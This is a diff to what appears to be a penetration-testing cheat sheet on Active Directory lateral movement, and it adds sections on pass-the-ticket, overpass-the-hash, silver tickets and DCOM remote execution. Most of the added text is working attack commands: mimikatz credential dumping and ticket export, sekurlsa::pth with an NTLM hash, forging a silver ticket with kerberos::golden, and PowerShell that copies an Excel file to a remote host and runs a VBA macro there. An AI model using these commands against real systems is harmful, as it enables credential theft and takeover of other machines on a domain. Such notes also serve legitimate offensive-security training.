@@ -218,12 +218,20 @@ psexec PTH
 
 WinRM PTH
 
-    evil-winrm -i VICTIM_IP -u MyUser -H NTLM_HASH
+    evil-winrm -i VICTIM_IP -u MyUser -H NTLM_HASH  
+    
+    
+## Pass the ticket  
+
 
 Pass-the-Ticket
 
     mimikatz # privilege::debug
     mimikatz # sekurlsa::tickets /export
+
+The TGT can only be used on the machine it was created for, so the TGS has more potential and can be used across the network.  
+
+
 
 Once the desired ticket has been extracted.
 
@@ -281,6 +289,112 @@ Eiter set to -Pass for single password or -File for a wordlist. -Admin is for ad
 `.\Spray-Passwords.ps1 -Pass Qwerty09! -Admin`  
 
 
+## Over pass the hash  
+
+Run a application as another and then get the NTLM hash from memory.  
+
+`sekurlsa::logonpasswords`  
+
+Create a process without performing NTLM authentication over the network.  
+
+`sekurlsa::pth /user:bob_admin /domain:corp.com /ntlm:e2b475c11da2a0748290d87aa966c327 /run:PowerShell.exe`  
+
+Then authenticate to a network share to get the ticket, any command could be used that requires domain permissions.  
+
+`net use \\dc01`  
+
+As PSExec.exe will only authenticate with a kerberos ticket and not a hashed password, we can now use it.  
+
+`.\PsExec.exe \\dc01 cmd.exe`  
+
+
+## Silver ticket  
+
+Creating a ticket with a spn and any permissions we desire. The password must be hashed, if it is in clear text then it needs to be hashed first.  
+
+Obtain the SID of the current user, only the domain identifier from the SID is needed, which is everything apart from the last -XXXX (RID).  
+
+`whoami /user`  
+
+Flush out existing tickets, check it has completed then create a silver ticket, /target is fully qualified name and /ptt is to inject it into memory.  
+
+```
+kerberos::purge
+kerberos::list
+kerberos::golden /user:bob /domain:corp.com /sid:S-1-5-21-1602875587-2787523311-2599479668 /target:myWebServer.corp.com /service:HTTP /rc4:E2B475C11DA2A0748290D87AA966C327 /ptt
+```
  
- 
- 
+Check it has been created.  
+
+`kerberos::list`  
+
+## Distributed Component Object Model (DCOM)  
+
+DCOM is a system that is created for software components to interact with eachother over the network.  
+
+Using powershell, find out members and sub-objects of the DCOM object, which in this case is an excel object.  
+
+```
+$com = [activator]::CreateInstance([type]::GetTypeFromProgId("Excel.Application", "192.168.1.110"))
+
+$com | Get-Member
+```  
+
+Using the run method that executes a VBA script remotely, a poc VBA script can be created that executes notepad. The file is saved in legacy format .xsl
+
+```
+Sub mymacro()
+    Shell ("notepad.exe")
+End Sub
+```  
+
+Copy an Excel document to a remote machine, overwriting if it exists.  
+
+```
+$LocalPath = "C:\Users\jeff_admin.corp\myexcel.xls"
+
+$RemotePath = "\\192.168.1.110\c$\myexcel.xls"
+
+[System.IO.File]::Copy($LocalPath, $RemotePath, $True)
+```  
+
+Create a directory so the application can have a profile to use for opening.  
+
+```
+$Path = "\\192.168.1.110\c$\Windows\sysWOW64\config\systemprofile\Desktop"
+
+$temp = [system.io.directory]::createDirectory($Path)
+```  
+
+Open the application.  
+
+```
+$Workbook = $com.Workbooks.Open("C:\myexcel.xls")
+```  
+
+Call the run method to pop notepad.  
+
+```
+$com = [activator]::CreateInstance([type]::GetTypeFromProgId("Excel.Application", "192.168.1.110"))
+
+$LocalPath = "C:\Users\jeff_admin.corp\myexcel.xls"
+
+$RemotePath = "\\192.168.1.110\c$\myexcel.xls"
+
+[System.IO.File]::Copy($LocalPath, $RemotePath, $True)
+
+$Path = "\\192.168.1.110\c$\Windows\sysWOW64\config\systemprofile\Desktop"
+
+$temp = [system.io.directory]::createDirectory($Path)
+
+$Workbook = $com.Workbooks.Open("C:\myexcel.xls")
+
+$com.Run("mymacro")
+```  
+
+
+
+## Windows Management Instrumentation  
+
+## Powershell Remoting  
+
